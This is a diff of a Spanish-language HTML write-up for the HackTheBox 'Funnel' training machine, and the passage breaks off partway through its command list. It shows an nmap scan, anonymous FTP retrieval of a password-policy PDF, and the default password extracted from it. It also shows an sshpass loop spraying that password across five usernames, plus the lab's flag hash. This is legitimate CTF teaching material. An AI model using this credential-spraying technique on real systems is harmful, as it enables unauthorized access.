@@ -1,245 +1,379 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Funnel — HTB Writeup | YRD</title>
-  <style>
-    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
-    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
-    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
-    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
-    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
-    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
-    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
-    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
-    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
-    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
-    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
-    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
-    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
-    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
-    .hero h1 span{color:var(--primary);}
-    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
-    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
-    .meta-item{display:flex;flex-direction:column;gap:4px;}
-    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
-    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
-    .meta-value.green{color:var(--primary);}
-    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
-    @media(max-width:900px){.main{grid-template-columns:1fr;}}
-    .content{display:flex;flex-direction:column;gap:2rem;}
-    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
-    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
-    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
-    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
-    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
-    .section p:last-child{margin-bottom:0;}
-    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
-    .section li{margin-bottom:0.3rem;}
-    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
-    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
-    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
-    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
-    .comment{color:#6a9955;}
-    .cmd{color:var(--cyan);}
-    .output{color:var(--text-dim);}
-    .highlight{color:var(--primary);font-weight:600;}
-    .cred{color:var(--yellow);font-weight:600;}
-    .flag-val{color:#ff79c6;}
-    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
-    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
-    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
-    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
-    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
-    .timeline{display:flex;flex-direction:column;gap:0;}
-    .timeline-item{display:flex;gap:1.25rem;}
-    .timeline-left{display:flex;flex-direction:column;align-items:center;}
-    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
-    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
-    .timeline-item:last-child .timeline-line{display:none;}
-    .timeline-content{padding-bottom:1.5rem;}
-    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
-    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
-    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
-    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
-    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
-    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
-    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
-    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
-    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
-    .detail-row:last-child{border-bottom:none;}
-    .detail-key{font-size:0.8rem;color:var(--text-muted);}
-    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
-    .detail-val.green{color:var(--primary);}
-    .detail-val.cyan{color:var(--cyan);}
-    .skill-item{margin-bottom:1rem;}
-    .skill-item:last-child{margin-bottom:0;}
-    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
-    .skill-name{font-size:0.82rem;color:var(--text-dim);}
-    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
-    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
-    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
-    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
-    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
-    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
-    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
-    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
-    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
-    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
-    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
-    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
-    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
-    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
-    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
-    .data-table td{color:var(--text-dim);}
-    a{color:var(--primary);text-decoration:none;}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB — Funnel | FTP Anon + SSH Tunnel + PostgreSQL</title>
+<style>
+:root {
+  --accent:#4ade80;--accent-dim:#16a34a;--accent-glow:rgba(74,222,128,0.15);
+  --bg:#0a0e1a;--bg2:#0f1629;--bg3:#141d35;
+  --card:#111827;--card2:#1a2540;--border:#1e2d4a;
+  --text:#e2e8f0;--text-muted:#64748b;--text-dim:#94a3b8;
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;
+  --orange:#fb923c;--cyan:#22d3ee;--green:#4ade80;
+}
+*, *::before, *::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.7;font-size:15px;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:'JetBrains Mono',monospace;font-size:.88em;color:var(--accent);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:'JetBrains Mono',monospace;}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-size:1.4rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;}
+/* HERO */
+.hero{background:linear-gradient(135deg,#0a0e1a,#0d1a2b,#091a10);padding:4rem 2rem 3rem;position:relative;overflow:hidden;border-bottom:1px solid var(--border);}
+.hero::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 60% 40%,rgba(74,222,128,.06) 0%,transparent 60%);}
+.hero-inner{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:0 1.5rem;}
+.watermark{position:absolute;right:3rem;bottom:.5rem;font-size:9rem;color:rgba(74,222,128,.04);font-family:'JetBrains Mono',monospace;font-weight:900;line-height:1;user-select:none;}
+.badge{display:inline-block;background:rgba(74,222,128,.1);color:var(--accent);border:1px solid rgba(74,222,128,.3);border-radius:100px;padding:.25rem 1rem;font-size:.75rem;font-weight:600;margin-bottom:1rem;}
+.hero h1{font-size:3rem;font-weight:900;color:#fff;margin-bottom:.25rem;}
+.hero .subtitle{font-size:1.1rem;color:var(--text-dim);margin-bottom:1.25rem;}
+.meta-chips{display:flex;gap:.75rem;flex-wrap:wrap;margin-bottom:1.25rem;}
+.chip{background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:.3rem .75rem;font-size:.8rem;color:var(--text-dim);}
+.flag-display{font-family:'JetBrains Mono',monospace;background:rgba(74,222,128,.1);color:var(--accent);padding:.5rem 1.25rem;border-radius:8px;display:inline-block;font-size:.9rem;border:1px solid rgba(74,222,128,.2);}
+/* LAYOUT */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}}
+.section{margin:2.5rem 0;}
+/* STATS */
+.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:700px){.stats-row{grid-template-columns:repeat(2,1fr);}}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;text-align:center;}
+.stat-num{font-size:2.4rem;font-weight:900;color:var(--accent);font-family:'JetBrains Mono',monospace;line-height:1;}
+.stat-label{font-size:.7rem;text-transform:uppercase;letter-spacing:2px;color:var(--text-muted);margin-top:.4rem;}
+/* STEP BOXES */
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--accent);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:'JetBrains Mono',monospace;}
+.section-number{display:inline-flex;align-items:center;justify-content:center;width:30px;height:30px;background:var(--accent);color:#0a0e1a;font-weight:900;font-size:.85rem;border-radius:6px;margin-right:.75rem;font-family:'JetBrains Mono',monospace;flex-shrink:0;vertical-align:middle;}
+.section-title{display:flex;align-items:center;margin-bottom:1.25rem;border-bottom:1px solid var(--border);padding-bottom:.5rem;}
+.section-title h2{border:none;margin:0;padding:0;}
+/* CALLOUT / INFO BOXES */
+.why-box{background:rgba(96,165,250,.07);border-left:3px solid var(--blue);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--blue);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text-dim);}
+.interpret-box{background:rgba(74,222,128,.07);border-left:3px solid var(--accent);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--accent);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text-dim);}
+.decision-box{background:rgba(251,146,60,.07);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text-dim);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text-dim);}
+.warn-box{background:rgba(248,113,113,.06);border:1px solid rgba(248,113,113,.25);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.warn-box h3{color:var(--red);margin-bottom:.75rem;}
+.warn-box p{font-size:.9rem;color:var(--text-dim);}
+.tip-box{background:rgba(74,222,128,.05);border:1px solid rgba(74,222,128,.2);border-radius:10px;padding:1.1rem 1.25rem;margin:1rem 0;}
+.tip-box strong{color:var(--accent);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.35rem;}
+.tip-box p{font-size:.88rem;color:var(--text-dim);}
+/* COMMANDS */
+.cmd-annotated{background:#050810;border-radius:8px;padding:1.25rem 1.5rem;font-family:'JetBrains Mono',monospace;margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2.2;}
+.cmd{color:var(--green);font-weight:700;}
+.flag-opt{color:var(--yellow);}
+.ip{color:var(--orange);}
+.param{color:var(--cyan);}
+.user{color:var(--purple);}
+.path{color:var(--blue);}
+.comment{color:var(--text-muted);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text-dim);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:#050810;border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--text-dim);margin:1rem 0;line-height:1.8;}
+.output-label{font-size:.65rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.hl-flag{color:var(--accent);font-weight:700;}
+.hl-warn{color:var(--yellow);font-weight:700;}
+.hl-danger{color:var(--red);}
+.hl-info{color:var(--cyan);}
+/* COMMANDS SUMMARY */
+.cmds-summary{background:var(--card);border:2px solid rgba(74,222,128,.3);border-radius:14px;padding:1.75rem;margin:2rem 0;}
+.cmds-summary-title{font-size:.72rem;color:var(--accent);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:1.25rem;font-family:'JetBrains Mono',monospace;}
+.cmd-effective{display:flex;gap:1rem;align-items:flex-start;padding:.9rem 0;border-bottom:1px solid var(--border);}
+.cmd-effective:last-child{border-bottom:none;}
+.cmd-num{background:rgba(74,222,128,.15);color:var(--accent);border-radius:6px;padding:.2rem .55rem;font-size:.75rem;font-weight:700;font-family:'JetBrains Mono',monospace;flex-shrink:0;margin-top:.15rem;}
+.cmd-effective-body{flex:1;}
+.cmd-effective-line{font-family:'JetBrains Mono',monospace;font-size:.88rem;color:var(--text);background:#050810;padding:.6rem .9rem;border-radius:6px;margin-bottom:.35rem;}
+.cmd-effective-desc{font-size:.8rem;color:var(--text-muted);}
+.cmd-effective-output{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--text-dim);background:#050810;border-left:2px solid var(--accent);padding:.5rem .75rem;border-radius:0 6px 6px 0;margin-top:.35rem;}
+/* ATTACK FLOW */
+.attack-flow{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin:1.5rem 0;}
+.flow-step{background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:.6rem 1rem;font-size:.82rem;color:var(--text-dim);font-family:'JetBrains Mono',monospace;}
+.flow-arrow{color:var(--accent);font-size:1.2rem;font-weight:700;}
+.flow-step.success{border-color:rgba(74,222,128,.4);color:var(--accent);}
+.flow-step.tunnel{border-color:rgba(96,165,250,.4);color:var(--blue);}
+/* VULN CARDS */
+.vuln-card{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--red);border-radius:0 12px 12px 0;padding:1.25rem 1.5rem;margin:1rem 0;}
+.vuln-card.medium{border-left-color:var(--yellow);}
+.vuln-card.low{border-left-color:var(--blue);}
+.vuln-severity{display:inline-block;padding:.2rem .6rem;border-radius:4px;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:.6rem;font-family:'JetBrains Mono',monospace;}
+.sev-critical{background:rgba(248,113,113,.15);color:var(--red);}
+.sev-medium{background:rgba(251,191,36,.12);color:var(--yellow);}
+.sev-low{background:rgba(96,165,250,.12);color:var(--blue);}
+.vuln-title{font-size:1rem;font-weight:700;color:var(--text);margin-bottom:.5rem;}
+.vuln-desc{font-size:.88rem;color:var(--text-dim);}
+/* TIMELINE */
+.timeline{padding-left:28px;position:relative;margin:1.5rem 0;}
+.timeline::before{content:'';position:absolute;left:6px;top:0;bottom:0;width:2px;background:var(--border);}
+.tl-item{position:relative;padding-bottom:1.75rem;}
+.tl-item:last-child{padding-bottom:0;}
+.tl-dot{position:absolute;left:-23px;top:4px;width:12px;height:12px;border-radius:50%;border:2px solid var(--accent);background:var(--bg);}
+.tl-dot.blue{border-color:var(--blue);}
+.tl-dot.orange{border-color:var(--orange);}
+.tl-dot.purple{border-color:var(--purple);}
+.tl-dot.yellow{border-color:var(--yellow);}
+.tl-dot.red{border-color:var(--red);}
+.tl-time{font-size:.7rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace;margin-bottom:.25rem;}
+.tl-title{font-size:.92rem;font-weight:600;color:var(--text);margin-bottom:.25rem;}
+.tl-desc{font-size:.83rem;color:var(--text-dim);}
+/* FLAG BOX */
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(74,222,128,.02));border:1px solid rgba(74,222,128,.3);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;}
+.flag-value{font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--accent);background:rgba(74,222,128,.1);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(74,222,128,.2);}
+/* REC GRID */
+.rec-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.rec-grid{grid-template-columns:1fr;}}
+.rec-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.rec-badge{display:inline-block;padding:.2rem .55rem;border-radius:4px;font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:.6rem;}
+.priority-high{background:rgba(248,113,113,.12);color:var(--red);}
+.priority-medium{background:rgba(251,191,36,.1);color:var(--yellow);}
+.priority-low{background:rgba(96,165,250,.1);color:var(--blue);}
+.rec-card h4{font-size:.9rem;font-weight:700;color:var(--text);margin-bottom:.5rem;}
+.rec-card p{font-size:.83rem;color:var(--text-dim);}
+/* LESSONS */
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--blue);}
+.lesson-card li{font-size:.83rem;color:var(--text-dim);}
+/* AGENTS */
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--blue);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--blue);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text-dim);}
+/* SIDEBAR */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text-muted);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text-muted);}.meta-value{color:var(--text);font-weight:600;font-family:'JetBrains Mono',monospace;font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.1);color:var(--purple);border:1px solid rgba(167,139,250,.25);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:'JetBrains Mono',monospace;margin:.2rem .15rem;}
+/* TOC */
+.toc-link{display:block;font-size:.8rem;color:var(--text-dim);padding:.3rem 0;border-bottom:1px solid var(--border);text-decoration:none;}
+.toc-link:last-child{border-bottom:none;}
+.toc-link:hover{color:var(--accent);}
+.toc-num{color:var(--accent);font-family:'JetBrains Mono',monospace;margin-right:.4rem;font-size:.75rem;}
+/* BADGE */
+.badge-green{background:rgba(74,222,128,.12);color:var(--green);border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-weight:600;}
+.badge-red{background:rgba(248,113,113,.12);color:var(--red);border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-weight:600;}
+.badge-yellow{background:rgba(251,191,36,.1);color:var(--yellow);border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-weight:600;}
+.badge-blue{background:rgba(96,165,250,.1);color:var(--blue);border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-weight:600;}
+.badge-cyan{background:rgba(34,211,238,.1);color:var(--cyan);border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-weight:600;}
+.badge-purple{background:rgba(167,139,250,.1);color:var(--purple);border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-weight:600;}
+/* GLOSARIO */
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:'JetBrains Mono',monospace;display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text-muted);line-height:1.4;}
+/* DATA TABLE */
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text-muted);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+</style>
 </head>
 <body>
-<canvas id="matrix"></canvas>
 
+<!-- ═══════════════════════════════════════════════════════ HERO ═══ -->
 <div class="hero">
-  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Funnel</div>
-  <div class="tags">
-    <span class="tag tag-htb">HTB</span>
-    <span class="tag tag-os">LINUX</span>
-    <span class="tag tag-veryeasy">VERY EASY</span>
-    <span class="tag tag-htb">STARTING POINT</span>
+  <div class="hero-inner">
+    <div class="badge">HTB · Starting Point · Very Easy · Linux</div>
+    <h1>Funnel</h1>
+    <p class="subtitle">FTP Anonymous + Credenciales por defecto + SSH Port Forwarding + PostgreSQL interno</p>
+    <div class="meta-chips">
+      <span class="chip">🐧 Ubuntu Linux</span>
+      <span class="chip">📡 10.129.7.157</span>
+      <span class="chip">🔌 FTP 21 + SSH 22</span>
+      <span class="chip">🗄 PostgreSQL 5432</span>
+      <span class="chip">⏱ ~8 minutos</span>
+      <span class="chip">💻 7 comandos clave</span>
+    </div>
+    <div class="flag-display">FLAG: cf277664b1771217d7006acdea006db1</div>
   </div>
-  <h1>Funnel <span>Machine</span></h1>
-  <p class="hero-desc">FTP anónimo con credenciales expuestas, SSH tunneling a servicio PostgreSQL interno y extracción de la flag desde la base de datos a través del túnel.</p>
-  <div class="meta-row">
-    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
-    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Starting Point</span></div>
-    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">nmap / ftp</span></div>
-    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
+  <div class="watermark">></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ STATS ═══ -->
+<div class="stats-row">
+  <div class="stat-card">
+    <div class="stat-num">2</div>
+    <div class="stat-label">Puertos Externos</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-num">5</div>
+    <div class="stat-label">Usuarios en PDF</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-num">1</div>
+    <div class="stat-label">Túnel SSH-L</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-num">8</div>
+    <div class="stat-label">Minutos totales</div>
   </div>
 </div>
 
-<div class="main">
-  <div class="content">
+<!-- ═══════════════════════════════════════════════════════ GRID ═══ -->
+<div class="container">
+<main>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Comandos Efectivos — Secuencia Completa</h2></div>
-      
+<!-- SECUENCIA RÁPIDA DE COMANDOS -->
+<div class="section">
+  <h2>Comandos Efectivos — Secuencia Completa</h2>
+  <p style="color:var(--text-dim);font-size:.9rem;margin-bottom:1.25rem;">7 comandos que ejecutamos en orden. Cada uno con su output clave.</p>
 
-<p style="color:var(--text-dim);font-size:.9rem;margin-bottom:1.25rem;">7 comandos que ejecutamos en orden. Cada uno con su output clave.</p>
+  <div class="cmds-summary">
+    <div class="cmds-summary-title">⚡ Secuencia de ataque — 7 comandos, ~8 minutos</div>
 
-
-<div class="cmds-summary">
-<div class="cmds-summary-title">⚡ Secuencia de ataque — 7 comandos, ~8 minutos</div>
-<div class="cmd-effective">
-<div class="cmd-num">01</div>
-<div class="cmd-effective-body">
-<div class="cmd-effective-line">nmap -sC -sV -p- --open -T4 10.129.7.157</div>
-<div class="cmd-effective-desc">Descubrir puertos y versiones de servicios</div>
-<div class="cmd-effective-output">21/tcp open  ftp     vsftpd 3.0.3  (Anonymous FTP login allowed)<br/>22/tcp open  ssh     OpenSSH 8.2p1</div>
-</div>
-</div>
-<div class="cmd-effective">
-<div class="cmd-num">02</div>
-<div class="cmd-effective-body">
-<div class="cmd-effective-line">ftp anonymous@10.129.7.157  → ls  → cd mail_backup  → get welcome_28112022  → get password_policy.pdf</div>
-<div class="cmd-effective-desc">FTP anónimo: descargar email de bienvenida y política de contraseñas</div>
-<div class="cmd-effective-output">drwxr-xr-x    2 ftp  ftp  mail_backup/<br/>-rw-r--r--    welcome_28112022<br/>-rw-r--r--    password_policy.pdf</div>
-</div>
-</div>
-<div class="cmd-effective">
-<div class="cmd-num">03</div>
-<div class="cmd-effective-body">
-<div class="cmd-effective-line">python3 -c "import zlib,struct; ..." # extraer streams FlateDecode del PDF</div>
-<div class="cmd-effective-desc">Extraer texto del PDF con Python + zlib</div>
-<div class="cmd-effective-output" style="color:var(--yellow);font-weight:700;">the default password of 'funnel123#!#' must be changed immediately</div>
-</div>
-</div>
-<div class="cmd-effective">
-<div class="cmd-num">04</div>
-<div class="cmd-effective-body">
-<div class="cmd-effective-line">for user in optimus albert andreas christine maria; do sshpass -p 'funnel123#!#' ssh $user@10.129.7.157 'id' 2&gt;/dev/null &amp;&amp; echo "EXITO: $user"; done</div>
-<div class="cmd-effective-desc">Probar contraseña por defecto en los 5 usuarios del email</div>
-<div class="cmd-effective-output" style="color:var(--accent);font-weight:700;">EXITO: christine → uid=1000(christine)</div>
-</div>
-</div>
-<div class="cmd-effective">
-<div class="cmd-num">05</div>
-<div class="cmd-effective-body">
